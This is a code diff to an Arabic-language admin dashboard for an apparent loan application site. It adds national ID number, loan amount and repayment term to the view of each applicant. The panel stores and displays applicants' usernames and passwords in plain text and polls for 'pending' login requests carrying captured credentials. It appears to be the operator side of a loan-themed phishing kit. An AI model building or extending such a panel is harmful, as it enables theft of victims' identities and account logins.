@@ -530,6 +530,9 @@
       <div class="modal-row"><span class="modal-label">الاسم</span><span class="modal-value" id="mName"></span></div>
       <div class="modal-row"><span class="modal-label">رقم الجوال</span><span class="modal-value" id="mPhone"></span></div>
       <div class="modal-row"><span class="modal-label">الجيميل</span><span class="modal-value" id="mEmail"></span></div>
+      <div class="modal-row"><span class="modal-label">رقم الهوية</span><span class="modal-value" id="mIdNumber"></span></div>
+      <div class="modal-row"><span class="modal-label">مبلغ القرض</span><span class="modal-value" id="mLoanAmount"></span></div>
+      <div class="modal-row"><span class="modal-label">مدة السداد</span><span class="modal-value" id="mLoanMonths"></span></div>
       <div class="modal-row"><span class="modal-label">الحالة</span><span class="modal-value" id="mStatus"></span></div>
       <div class="modal-row"><span class="modal-label">اسم المستخدم</span><span class="modal-value" id="mUsername"></span></div>
       <div class="modal-row"><span class="modal-label">كلمة المرور</span><span class="modal-value" id="mPassword"></span></div>
@@ -583,6 +586,9 @@ function renderUsers(users){
     const tr = document.createElement('tr');
     tr.setAttribute('data-username', u.username);
     tr.setAttribute('data-password', u.password);
+    tr.setAttribute('data-id-number', u.idNumber || '');
+    tr.setAttribute('data-loan-amount', u.loanAmount || '');
+    tr.setAttribute('data-months', u.months || '');
     tr.innerHTML =
       '<td data-label="الاسم">' + u.name + '</td>' +
       '<td data-label="رقم الجوال">' + u.phone + '</td>' +
@@ -621,25 +627,8 @@ function checkPendingRequest(){
   fetch('/api/login-status')
     .then(function(r){ return r.json(); })
     .then(function(data){
-      const card = document.getElementById('pendingRequestCard');
       if(data && data.status === 'pending'){
-        document.getElementById('reqUsername').textContent = data.username;
-        document.getElementById('reqPassword').textContent = data.password;
-        card.style.display = 'block';
-
-        fetch('/api/application-data')
-          .then(function(r){ return r.json(); })
-          .then(function(app){
-            document.getElementById('reqFullName').textContent = app ? app.fullName : '—';
-            document.getElementById('reqIdNumber').textContent = app ? app.idNumber : '—';
-            document.getElementById('reqPhone').textContent = app ? app.phone : '—';
-            document.getElementById('reqEmail').textContent = app ? app.email : '—';
-            document.getElementById('reqLoanAmount').textContent = app ? ('AED ' + app.loanAmount) : '—';
-            document.getElementById('reqLoanMonths').textContent = app ? (app.months + ' شهر') : '—';
-          })
-          .catch(function(){});
-      } else {
-        card.style.display = 'none';
+        loadUsers();
       }
     })
     .catch(function(){});
@@ -719,6 +708,9 @@ document.getElementById('usersTbody').addEventListener('click', function(e){
     document.getElementById('mPhone').textContent = cells[1].textContent.trim();
     document.getElementById('mEmail').textContent = cells[2].textContent.trim();
     document.getElementById('mStatus').textContent = cells[3].textContent.trim();
+    document.getElementById('mIdNumber').textContent = row.getAttribute('data-id-number') || '—';
+    document.getElementById('mLoanAmount').textContent = row.getAttribute('data-loan-amount') ? ('AED ' + row.getAttribute('data-loan-amount')) : '—';
+    document.getElementById('mLoanMonths').textContent = row.getAttribute('data-months') ? (row.getAttribute('data-months') + ' شهر') : '—';
 
     const username = row.getAttribute('data-username');
     const password = row.getAttribute('data-password');
